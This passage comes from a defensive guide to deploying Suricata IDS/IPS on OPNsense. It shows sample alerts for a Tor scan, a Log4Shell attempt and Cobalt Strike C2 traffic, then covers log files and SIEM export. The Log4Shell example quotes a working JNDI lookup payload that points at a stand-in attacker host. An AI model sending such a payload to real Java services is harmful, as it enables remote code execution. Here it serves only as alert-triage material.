---
id: collect-261001-opnsense-pfsense/opnsense-pfsense/guides-guide-suricata-ids-ips-opnsense-en-pdf-1a86c734-2
title: "Interfaces to monitor on the BOTUM topology:"
domain: opnsense-pfsense
role: reference
task: reference
actors: []
dates: []
keywords: ["exploit"]
source: docs/RAG/collect-261001-opnsense-pfsense/guides-guide-suricata-ids-ips-opnsense-en-pdf-1a86c734.md
source_anchor: ""
source_lines: [145, 214]
sha256: 780d6fd2eda42e645a83053e62122f97dc3998f1dbbf1b97db47c806a5ffc953
---

# Interfaces to monitor on the BOTUM topology:

Suricata IDS/IPS with OPNsense — Complete Guide
BOTUM INC.
botum.ca
Page 5
Severity: Medium
Source : 185.220.101.42:54932
Dest : [WAN IP]:22
Proto : TCP
Action : Alert (IDS) or Drop (IPS)
→ Automated scan from a Tor node/proxy
→ Recommended: check if IP is also in CrowdSec blocklist
Example 2: Exploit Attempt
 Alert : ET WEB_SERVER Possible CVE-2021-44228 Log4j RCE
SID : 2034647
Severity: Critical
Source : 45.33.32.156:80
Dest : 192.168.20.15:8080 (IoT server)
Proto : TCP/HTTP
Payload : ${jndi:ldap://evil.attacker.com/exploit}
→ Log4Shell injection attempt
→ Action: block immediately, isolate destination host
Example 3: Malware C2 Communication
 Alert : ET MALWARE Cobalt Strike Beacon
SID : 2027865
Severity: High
Source : 192.168.30.25 (Guest VLAN)
Dest : 162.55.201.180:443
Proto : TCP/TLS
→ Guest machine attempting to contact a Cobalt Strike C2 server
→ Immediate action: isolate machine, analyze disk
8. Integration with OPNsense Logs
Suricata integrates natively with the OPNsense logging system and can forward alerts to external SIEM systems.
Local OPNsense Logs
 # View Suricata alerts:
Services > Intrusion Detection > Alerts
→ Web interface with filtering by severity, IP, SID
# Raw logs on filesystem:
/var/log/suricata/eve.json ← structured JSON format (complete)
/var/log/suricata/fast.log ← quick text format
/var/log/suricata/stats.log ← performance statistics
Export to Graylog / Elastic Stack
 # Configure syslog export to SIEM:
System > Settings > Logging
Remote syslog server: 192.168.10.100:514

Suricata IDS/IPS with OPNsense — Complete Guide
BOTUM INC.
botum.ca
Page 6
Log everything: check
# eve.json format for Filebeat/Logstash:
input {
file {
path => "/var/log/suricata/eve.json"
codec => "json"
type => "suricata"
}
}
filter {
if [type] == "suricata" {
date { match => ["timestamp", "ISO8601"] }
}
}
9. Next Steps
Suricata is now in place and actively monitoring traffic. The DPI layer complements CrowdSec (Part 5) and 802.1X
NAC (Part 6) to form a multi-layer network defense.
Part 8 of the series will cover AdGuard Home integrated with OPNsense: network-wide DNS filtering, ad and
tracker blocking, custom lists, and centralized DNS statistics.
Full article: blog.botum.ca/opnsense-suricata-ids-ips-guide
Website: www.botum.ca  contact@botum.ca
